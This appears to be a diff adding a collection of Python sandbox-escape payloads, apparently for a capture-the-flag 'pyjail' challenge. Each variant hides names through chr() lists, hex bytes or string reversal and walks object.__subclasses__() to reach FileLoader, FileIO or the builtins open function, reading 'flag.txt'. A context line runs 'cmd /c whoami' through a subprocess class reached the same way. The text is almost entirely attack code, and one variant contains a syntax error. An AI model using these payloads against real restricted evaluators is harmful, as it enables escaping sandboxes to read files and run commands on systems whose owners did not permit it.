@@ -43,3 +43,57 @@ built=gl[bkey]
 built[ikey](pk)
 cls=[c for c in ().__class__.__mro__[1].__subclasses__() if type.__getattribute__(c,'__name__')==cname][0]
 print(cls(['cmd','/c','whoami'],stdout=-1).communicate()[0])
+
+
+
+FileLoader + chr
+
+fn=''.join(map(chr,[102,108,97,103,46,116,120,116]))
+loader=(().__class__.__bases__[0].__subclasses__()[122])('.',fn)
+method=''.join(map(chr,[103,101,116,95,100,97,116,97]))
+print(type(loader).__getattribute__(loader,method)(fn))
+FileLoader + hex bytes
+
+fromhex=bytes.fromhex
+fn=fromhex('666c61672e747874').decode()
+loader=[c for c in (()).__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(c)][0]('.',fn)
+method=fromhex('6765745f64617461').decode()
+print(type(loader).__getattribute__(loader,method)(fn))
+FileLoader + string reversal
+
+fn=''.join(format(c,'c') for c in (102,108,97,103,46,116,120,116))
+loader=(().__class__.__bases__[0].__subclasses__()[122])('.',fn)
+method='atad_teg'[::-1]
+print(type(loader).__getattribute__(loader,method)(fn))
+FileLoader discovered dynamically
+
+fn=''.join(map(chr,[102,108,97,103,46,116,120,116]))
+loader=[c for c in ().__class__.__bases__[0].__subclasses__() if str(c).endswith('FileLoader'>)][0]('.',fn)
+method=''.join(map(chr,[103,101,116,95,100,97,116,97]))
+print(type(loader).__getattribute__(loader,method)(fn))
+FileLoader method auto-detected
+
+fn=''.join(map(chr,[102,108,97,103,46,116,120,116]))
+loader=(().__class__.__bases__[0].__subclasses__()[122])('.',fn)
+method=[k for k in type(loader).__dict__ if k[:3]==''.join(map(chr,[103,101,116]))][0]
+print(type(loader).__getattribute__(loader,method)(fn))
+_io.FileIO chain (no import literals)
+
+fn=''.join(map(chr,[102,108,97,103,46,116,120,116]))
+base=(()).__class__.__mro__[1].__subclasses__()[111].__subclasses__()[0].__subclasses__()[0]
+file_obj=base(fn)
+method=''.join(map(chr,[114,101,97,100]))
+print(type(file_obj).__getattribute__(file_obj,method)())
+Recovered builtins → open
+
+fn=''.join(map(chr,[102,108,97,103,46,116,120,116]))
+subs=(()).__class__.__bases__[0].__subclasses__()
+func=[c for c in subs if type(c.__init__).__name__=='function'][0]
+gkey=''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95]))
+bkey=''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))
+rkey=''.join(map(chr,[114,101,97,100]))
+okey=''.join(map(chr,[111,112,101,110]))
+gl=type(func.__init__).__getattribute__(func.__init__,gkey)
+built=gl[bkey]
+fh=built[okey](fn)
+print(type(fh).__getattribute__(fh,rkey)())
